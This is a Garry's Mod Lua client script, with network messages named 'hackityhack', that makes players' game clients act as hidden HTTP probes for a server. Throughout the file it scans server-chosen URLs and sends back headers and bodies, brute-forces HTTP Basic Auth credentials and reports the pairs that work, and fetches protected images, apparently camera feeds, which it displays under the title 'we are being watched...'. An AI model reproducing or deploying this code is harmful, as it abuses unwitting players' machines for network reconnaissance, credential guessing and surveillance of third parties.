include("base64.lua")

local function OnReceiveImage(length, ply)
	local tmp = ""
	image = ""
	repeat
		tmp = net.ReadString()
		if tmp ~= "XXXMARKERXXX" then
			image = image .. tmp
		end
	until #tmp == 0 or tmp == "XXXMARKERXXX"
end
net.Receive("hackityhack_img_recv", OnReceiveImage)

function DisplayImage()
	local frame = vgui.Create( "DFrame" )
	frame:SetSize( 640, 480 )
	frame:SetTitle( "we are being watched..." )
	frame:SetVisible( true )
	frame:SetDraggable( true )
	frame:Center()
	--Fill the form with a html page
	local html = vgui.Create( "DHTML" , frame )
	html:Dock( FILL )
	html:SetHTML([[<img src="data:image/jpeg;base64,]] .. image .. [[" alt="hck" />]])
	
	frame:MakePopup()
end

function GetImage(url, user, pass)
	local request = {}
		
	request["failed"] = function(reason) end
	request["success"] = function(code, body, headers)
		net.Start("hackityhack_img_recv")
		net.WriteString(to_base64(body))
		net.SendToServer()
	end

	request["method"] = "get"
	request["url"] = url
	request["parameters"] = nil
	request["headers"] = {}
	request["headers"]["Authorization"] = "Basic " .. to_base64(user .. ":" .. pass)

	HTTP(request)
end

function TestHttp(url)

	local function MsgToServer(message)
		net.Start("hackityhack_scan")
		net.WriteString(message)
		net.SendToServer()
	end

	local request = {}

	request["failed"] = function(reason)
		-- it's too noisy and not overly useful, so commented out
		--MsgToServer("[FAIL] (" .. url .. "): " .. reason)
	end

	request["success"] = function(code, body, headers)
		if code == 504 then
			return
		end

		local response = "[OK - " .. tostring(code) .. "] (" .. url .. ")\n"
		for k, v in pairs(headers) do
			response = response .. k .. ": " .. v .. "\n"
		end
		response = response .. "\n" .. body
		
		MsgToServer(response)
	end

	request["method"] = "get"
	request["url"] = url
	request["parameters"] = nil
	request["headers"] = nil

	HTTP(request)
end

function TestHttpBasicAuth(url, user, pass)

	local function MsgToServer(message)
		net.Start("hackityhack_scan_auth")
		net.WriteString(message)
		net.SendToServer()
	end

	local request = {}

	request["failed"] = function(reason) end

	request["success"] = function(code, body, headers)
		if code ~= 401 then
			local response = "[OK] " .. url .. " (username: " .. user .. ", password: " .. pass .. ")"
			MsgToServer(response)
		end
	end

	request["method"] = "get"
	request["url"] = url
	request["parameters"] = nil
	request["headers"] = {}
	request["headers"]["Authorization"] = "Basic " .. to_base64(user .. ":" .. pass)

	HTTP(request)
end